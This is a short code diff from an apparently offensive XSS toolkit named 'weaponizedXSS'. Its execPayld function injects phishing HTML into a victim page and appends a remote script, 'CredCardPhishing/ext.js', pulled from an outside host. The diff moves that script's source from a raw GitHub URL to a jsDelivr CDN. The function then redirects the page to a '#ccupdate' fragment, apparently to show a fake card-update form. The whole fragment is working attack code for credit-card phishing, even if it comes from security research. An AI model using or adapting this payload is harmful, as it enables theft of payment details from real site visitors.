@@ -140,7 +140,7 @@ function execPayld() {
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
-  with(document)body.appendChild(createElement('script')).src=('https://raw.githubusercontent.com/lighthouseitsecurity/weaponizedXSS/refs/heads/main/CredCardPhishing/ext.js');
+  with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/lighthouseitsecurity/weaponizedXSS/CredCardPhishing/ext.js';
   setTimeout(() => {
     window.location.href = window.location.href.split('#')[0] + '#ccupdate';
   },
